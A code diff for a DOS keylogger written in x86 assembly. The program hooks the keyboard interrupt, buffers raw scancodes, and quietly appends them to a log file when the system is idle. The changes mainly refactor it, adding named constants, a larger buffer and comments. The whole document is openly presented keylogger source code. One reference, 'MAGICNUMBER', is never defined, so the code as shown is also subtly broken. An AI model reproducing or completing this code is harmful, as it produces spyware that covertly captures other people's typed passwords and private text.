@@ -5,10 +5,19 @@ org 100h
 Start:
 		jmp	real_start
 
-magic		dw	0BABAh
+SHIFT		equ	39h
+ALT		equ	2Ah
+CTRL		equ	36h		
+KYBDFLAGS	equ	417h
+PRESSEDSC	equ	43h
+PRESSED		equ	80h
+MAXBUFF		equ	50d
+MAGIC		equ	0BABAh
+
+magic		dw	MAGIC
 logfile		db	's:\OLD_HW\logger.txt', 0      
 handle		dw	0
-buf		db	41 dup (?)
+buf		db	50 dup (?)
 bufptr          dw	0
 must_write	db	0
 
@@ -22,31 +31,30 @@ new_09h:
 		push	cs                      
 		pop	ds	;Remember segments
 
-		cmp	bufptr, 5
+		cmp	bufptr, MAXBUFF
 		jae	call_old_09	;Check if buffer is overflown
 
 		in	al, 60h                 
 
-		cmp   	al, 39h  	;Don't remember Shift, Alt and Ctrl               
+		cmp   	al, SHIFT  	;Don't remember Shift, Alt and Ctrl               
 		ja    	call_old_09             
-		cmp   	al, 2Ah
+		cmp   	al, ALT
 		je    	call_old_09
-		cmp   	al, 36h                 
+		cmp   	al, CTRL                 
 		je    	call_old_09
 
-		push  	0
-		pop   	es                      
-		mov   	ah, byte ptr es:[417h]  
-		test  	ah, 43h                 ;Check if both shifts and CapsLock pressed
+		xor	bx, bx
+		mov	es, bx                  
+		mov   	ah, byte ptr es:[KYBDFLAGS]  
+		test  	ah, PRESSEDSC                 ;Check if both shifts and CapsLock pressed
 		je    	pk1                     
  
-		add   	al, 80h     	            
+		add   	al, PRESSED     	            
 pk1:
 		mov 	di, bufptr
       		mov   	buf[di], al             
       		inc   	di                      
       		mov   	bufptr, di
-      		mov   	must_write, 1           
                                     
 call_old_09:
 
@@ -68,40 +76,36 @@ new_28h:
 		push  	ds
 		push  	cs
 		pop   	ds
-
-		cmp   	must_write, 1
-		jne   	call_old_28  
            
-		cmp   	bufptr, 5              
-		jb    	call_old_28             
+		cmp   	bufptr, 0              
+		je    	call_old_28             ;Do not write if there's nothing to write
  
-		mov   	ax, 3d01h
+		mov   	ax, 3d01h		; Open file
 		lea   	dx, logfile             
 		int   	21h
                      
-		jc    	call_old_28             
+		jc    	call_old_28             ; Do not write if not open (Why did user delete it???)
 		mov   	handle, ax
 		mov   	bx, ax                  
-		mov   	ax, 4202h
+		mov   	ax, 4202h		; Move file pointer to the end of file
 		xor   	cx, cx
 		xor   	dx, dx
 		int   	21h
                      
 		jc    	call_old_28
              
-		mov   	ah, 40h
+		mov   	ah, 40h			; Write to file
 		mov   	bx, handle
 		mov   	cx, bufptr
 		lea   	dx, buf
 		int   	21h                     
 		jc    	call_old_28             
 
-		mov   	ah, 3Eh
+		mov   	ah, 3Eh			;Close file
 		mov   	bx, handle
 		int   	21h                     
 		jc    	call_old_28
  
-		mov   	must_write, 0
 		mov   	bufptr, 0
 
 call_old_28:
@@ -119,7 +123,7 @@ real_start:
 		mov	ax, 3509h		;Get old int09h address
 		int   	21h                     
  
-		cmp   	word ptr es:magic, 0BABAh ;Check if has been installed
+		cmp   	word ptr es:magic, MAGICNUMBER ;Check if has been installed
 		je    	already_inst
  
 		mov   	cs:old_09_offset, bx    ;Remember old int09h handler
@@ -156,7 +160,7 @@ create_log_file:
 		lea   	dx, logfile
 		int   	21h                     
 		mov   	handle, ax              
-		jnc   	clog4                   
+		jnc   	close                   
  
 clog3:
 		mov	ah, 3Ch         ;Create new file if not opened
@@ -165,7 +169,7 @@ clog3:
 		int	21h
 		mov	handle, ax
  
-clog4:
+close:
 		mov	bx, handle      ;Remember file handle
 		mov	ah, 3Eh		;Close file
 		int	21h
@@ -176,11 +180,10 @@ already_inst:
 		mov	dx, offset already_msg
 		mov	ah, 09h
 		int	21h
-		jmp	exit
+		xor	ah, ah
+		int	21h
  
 
-exit:
-		int	20h
  
 ok_installed	db 'KEYLOG successful installed$'
 already_msg	db 'KEYLOG already installed$'
